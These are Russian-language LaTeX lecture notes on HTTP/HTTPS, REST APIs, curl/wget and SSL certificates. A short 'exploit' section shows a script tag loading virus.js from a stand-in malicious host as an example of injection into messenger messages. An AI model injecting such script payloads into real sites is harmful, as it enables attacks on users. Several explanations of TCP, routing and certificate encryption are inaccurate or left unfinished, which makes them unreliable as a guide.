\documentclass[main.tex]{subfiles}
\begin{document}

\section{HTTP / HTTPS}

Hyper Text Transfer Protocol -- высокоуровневый протокол (в отличие от низкоуровневого TCP/IP)

Сам по себе TCP (Transmission Control Protocol) -- многоуровневый протокол, который описывает то, как может передаваться сигнал между двумя устройствами.

FTP (File Transfer Protocol) похож на HTTP, но передаёт файлы.

Почему http-сайты считаются небезопасными?

Компьютеры дома -- часть локальной сети, организованной домашним WiFi.

Сеть провайдера состоит из роутеров и сервера, к которому роутеры могут обращаться (роутеры также могут обращаться друг к другу).

У провайдера есть суперпровайдер...
В итоге сигнал попадает на http-сайт.

Можно (с помощью утилиты \texttt{ping} или более продвинутых) построить маршрут. Интернет -- некий граф, где можно построить путь.

Провайдер имеет возможность полностью просматривать трафик, который идёт через его сервер / маршрутизатор.
Точно также может

\textbf{HTTPS} -- протокол, работающий аналогично HTTP, но использующий SSL-шифрование.
Специальные компании выдают SSL-сертификаты (фактически, пару RSA-ключей, публичный и приватный).
Публичным ключом шифруются данные, идущие на сервер.

% TODO q: то, что идёт с сервера к нам, не шифруется?

\subsection{API, Rest API}

API $ \Leftrightarrow $ Application Programming Interface, программа, которая предоставляет интерфейс для другой программы.


\subsubsection{Rest API}

Открываем сайт <<Цифрового прорыва>> во вкладке инкогнито и смотрим.

Сайт написан на React.
Это фреймворк, который динамически строится на стороне клиента.
Вся старница очень маленькая.

\begin{leftbar}
    \LARGE{F12} -- Chrome DevTools
\end{leftbar}

Сообщение ВК: POST-запрос

Основная суть работы  Rest API: мы выбираем \textit{формат представления} (м.б. json, YAML, ...).
Виды запросов: POST, GET, PUT, DELETE, PATCH

Обычно метод POST используется для отправки данных на сервер, PUT -- обновления (как и UPDATE), GET -- получения

\textbf{CROSS} -- () % TODO

Бывает, что запрос нужно отправлять не на сам сайт.

% TODO

\subsection{cURL, wget}

Эти две утилиты делают примерно одно и то же.
\texttt{wget} входит в GNU.

С их помощью можно отлаживать запросы на сервер.

\textbf{Swagger} позволяет собрать http-запрос. \\

У нас есть некоторый метод (неважно, какой именно).
Мы вызываем его вручную через командную строку.

В адресной строке по умолчанию GET-запрос.

\begin{verbatim}
    curl -X <request>
\end{verbatim}

POST-запрос: немного сложнее, но мы только что это посмотрели.

В современном мире Swagger переименован в \texttt{OpenAPI}.

\subsection{exploit}

\begin{verbatim}
    <script>https://badhack.ru/virus.js</script>
\end{verbatim}

Если это встроить в сообщение в мессенджере, где нет защиты от эксплойта, можно встроить вредоносный скрипт (от будет подгружаться).

Почему в ТГ долго появлялся Markdown?
--Защита от эксплойта.

Может быть эксплойт в БД (с).

\begin{leftbar}

    ДЗ: см. в документе "Программа курса IT Python"

\end{leftbar}

Самоподписной сертификат не будет валидирован браузером.

Let's Encrypt -- бесплатный SSL-сертификат!!!
Платные нужны для более быстрой верификации браузерами.

\end{document}
